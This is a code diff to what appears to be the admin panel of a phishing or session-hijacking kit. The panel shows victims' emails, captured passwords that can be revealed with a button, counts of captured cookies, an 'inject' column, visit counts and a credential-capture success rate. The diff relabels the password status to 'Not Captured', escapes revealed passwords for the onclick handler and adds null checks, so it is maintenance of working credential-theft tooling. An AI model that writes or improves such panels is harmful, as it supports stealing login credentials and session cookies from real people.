@@ -1038,26 +1038,35 @@
                         try {
                             decodedPassword = atob(session.password);
                         } catch (e) {
+                            // Password might not be base64 encoded
                             decodedPassword = session.password;
                         }
                         const passwordMask = '█'.repeat(Math.min(decodedPassword.length, 12));
+
+                        // Escape special characters properly for onclick handler
+                        const escapedPassword = decodedPassword
+                            .replace(/\\/g, '\\\\')
+                            .replace(/'/g, "\\'")
+                            .replace(/"/g, '\\"')
+                            .replace(/\n/g, '\\n')
+                            .replace(/\r/g, '\\r');
 
                         passwordColumn = `
                             <div class="password-container">
                                 <div id="password-${index}" class="password-masked">
                                     ${passwordMask}
                                 </div>
-                                <button onclick="togglePassword(${index}, '${decodedPassword.replace(/'/g, "\\'")}')"
+                                <button onclick="togglePassword(${index}, '${escapedPassword}')"
                                     id="reveal-btn-${index}" class="reveal-btn">SHOW</button>
                             </div>
                         `;
                     } else if (session.status === 'valid') {
-                        passwordColumn = `<span class="status-badge" style="background: #422006; color: #fb923c;">⚠️ Password Not Displayed</span>`;
+                        passwordColumn = `<span class="status-badge" style="background: #422006; color: #fb923c;">⚠️ Password Not Captured</span>`;
                     } else if (session.status === 'invalid') {
                         const reason = session.reason || 'FAILED ENTRY';
                         passwordColumn = `<span class="status-badge status-error">❌ ${reason}</span>`;
                     } else {
-                        passwordColumn = `<span style="color: #94a3b8;">N/A - NO PASSWORD</span>`;
+                        passwordColumn = `<span style="color: #94a3b8;">N/A</span>`;
                     }
 
                     let injectColumn = '';
@@ -1080,24 +1089,41 @@
                         ? `<span class="status-badge status-success">✅ Valid</span>`
                         : `<span class="status-badge status-error">❌ Invalid</span>`;
 
+                    // Build session info HTML with proper null checks
+                    let sessionInfoHtml = `<div>ID: ${session.id || 'N/A'}</div>`;
+                    
+                    if (session.timestamp) {
+                        sessionInfoHtml += `<div class="session-info">TIMESTAMP: ${new Date(session.timestamp).toLocaleString()}</div>`;
+                    }
+                    
+                    if (session.status === 'valid') {
+                        sessionInfoHtml += `<div class="session-info">COOKIES: ${session.totalCookies || 0} ENCRYPTED</div>`;
+                        sessionInfoHtml += `<div class="session-info" style="color: #22c55e;">Status: Successful Authentication</div>`;
+                        
+                        // Add session metadata if available
+                        if (session.authMethod) {
+                            sessionInfoHtml += `<div class="session-info">Auth Method: ${session.authMethod}</div>`;
+                        }
+                    } else if (session.status === 'invalid') {
+                        sessionInfoHtml += `<div class="session-info" style="color: #ef4444;">Failure Reason: ${session.reason || 'Unknown Error'}</div>`;
+                        
+                        if (session.errorMessage) {
+                            sessionInfoHtml += `<div class="session-info" style="color: #fb923c;">Error: ${session.errorMessage}</div>`;
+                        }
+                        
+                        if (session.failureType) {
+                            sessionInfoHtml += `<div class="session-info">Type: ${session.failureType}</div>`;
+                        }
+                        
+                        sessionInfoHtml += `<div class="session-info" style="color: #fb923c;">Status: Failed Authentication</div>`;
+                    }
+
                     row.innerHTML = `
                         <td>${statusBadge}</td>
-                        <td class="email-cell">${session.email}</td>
+                        <td class="email-cell">${session.email || 'N/A'}</td>
                         <td>${passwordColumn}</td>
                         <td>${injectColumn}</td>
-                        <td>
-                            <div>ID: ${session.id}</div>
-                            <div class="session-info">
-                                TIMESTAMP: ${new Date(session.timestamp).toLocaleString()}
-                            </div>
-                            ${session.status === 'valid' ? 
-                                `<div class="session-info">COOKIES: ${session.totalCookies || 0} ENCRYPTED</div>
-                                 <div class="session-info" style="color: #22c55e;">Status: Successful Authentication</div>` :
-                                `<div class="session-info" style="color: #ef4444;">Failure Reason: ${session.reason || 'Unknown Error'}</div>
-                                 ${session.errorMessage ? `<div class="session-info" style="color: #fb923c;">Error Details: ${session.errorMessage}</div>` : ''}
-                                 <div class="session-info" style="color: #fb923c;">Status: Failed Authentication</div>`
-                            }
-                        </td>
+                        <td>${sessionInfoHtml}</td>
                     `;
 
                     tbody.appendChild(row);
@@ -1136,14 +1162,19 @@
                     throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                 }
 
-                const analytics = await response.json();
+                const data = await response.json();
 
-                updateAnalyticsCard('total-visits', analytics.totalVisits || 0);
-                updateAnalyticsCard('valid-entries', analytics.validEntries || 0);
-                updateAnalyticsCard('invalid-entries', analytics.invalidEntries || 0);
+                if (!data.success) {
+                    throw new Error(data.error || 'Failed to load analytics');
+                }
 
-                const total = (analytics.validEntries || 0) + (analytics.invalidEntries || 0);
-                const successRate = total > 0 ? Math.round((analytics.validEntries / total) * 100) : 0;
+                // Map backend analytics fields to frontend display
+                updateAnalyticsCard('total-visits', data.totalVisits || 0);
+                updateAnalyticsCard('valid-entries', data.validEntries || 0);
+                updateAnalyticsCard('invalid-entries', data.invalidEntries || 0);
+
+                const total = (data.validEntries || 0) + (data.invalidEntries || 0);
+                const successRate = total > 0 ? Math.round((data.validEntries / total) * 100) : 0;
                 updateAnalyticsCard('success-rate', successRate + '%');
 
             } catch (error) {
